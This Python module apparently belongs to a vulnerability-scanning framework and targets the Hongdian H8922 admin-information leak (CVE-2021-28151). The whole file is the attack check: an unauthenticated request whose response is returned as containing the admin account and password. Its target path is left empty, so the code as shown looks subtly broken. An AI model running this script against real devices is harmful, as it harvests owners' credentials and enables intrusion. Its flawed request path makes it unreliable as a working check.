#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
from colorama import init,Fore
init(autoreset=True)
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/iot/宏电/CVE-2018-9995 DVR登陆绕过宏电 H8922 后台管理员信息泄露漏洞 CVE-2021-28151.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '宏电 H8922 后台管理员信息泄露漏洞CVE-2021-28151',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  target = ''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "service webadmin" in res.text:
      ret['huixian'] = '账号密码在返回包里：  '+res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret